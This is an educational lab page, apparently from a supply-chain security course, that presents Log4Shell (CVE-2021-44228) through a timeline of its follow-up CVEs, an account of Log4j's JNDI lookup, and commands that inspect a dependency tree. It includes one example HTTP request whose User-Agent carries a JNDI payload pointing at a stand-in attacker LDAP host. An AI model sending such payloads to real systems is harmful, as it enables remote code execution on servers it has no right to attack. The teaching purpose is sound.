# Lab 6.9: Case Study: Log4Shell (CVE-2021-44228)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Understand</span>
  <span class="phase-arrow">›</span>
  <a href="../analyze/" class="phase-step upcoming">Analyze</a>
  <span class="phase-arrow">›</span>
  <a href="../lessons/" class="phase-step upcoming">Lessons</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## What Log4j Is and Why It Mattered

**Goal:** Understand Log4Shell as a supply chain problem: a dangerous feature in a transitive dependency nobody chose.

### The timeline

| Date | Event |
|------|-------|
| 2013 | Log4j 2.0 released with JNDI lookup support enabled by default |
| 2021-11-24 | Alibaba Cloud Security privately reports the vulnerability |
| 2021-12-09 | Public disclosure; PoC exploits within hours |
| 2021-12-10 | Mass exploitation begins worldwide |
| 2021-12-13 | CVE-2021-45046: 2.15.0 fix incomplete; Log4j 2.16.0 released |
| 2021-12-18 | CVE-2021-45105: DoS in 2.16.0; Log4j 2.17.0 released |
| 2021-12-28 | CVE-2021-44832: RCE via JDBC Appender; Log4j 2.17.1 released |

Four CVEs in three weeks. Each "fix" was incomplete.

### The JNDI lookup feature

Log4j supported variable interpolation in log messages: `${jndi:ldap://some-server/resource}`. When Log4j encountered this in **any logged string**, it performed a network lookup. Any user-controlled input that gets logged becomes an attack vector:

```
GET / HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/exploit}
```

The application logs the User-Agent, Log4j resolves the JNDI expression, connects to the attacker's LDAP server, and executes the returned Java class.

### Why this is a supply chain problem

```bash
cat /app/pom.xml
```

The `pom.xml` lists Spring Boot Web, Spring Data JPA, PostgreSQL. **Log4j does not appear.**

```bash
grep -n "log4j" /app/dependency-tree.txt
```

There it is, buried in the transitive tree. It arrives as a transitive dependency five levels deep. The developer never chose Log4j. They are running code they did not choose, from maintainers they do not know, with features they did not ask for.

```bash
cat /app/dependency-tree.txt
```
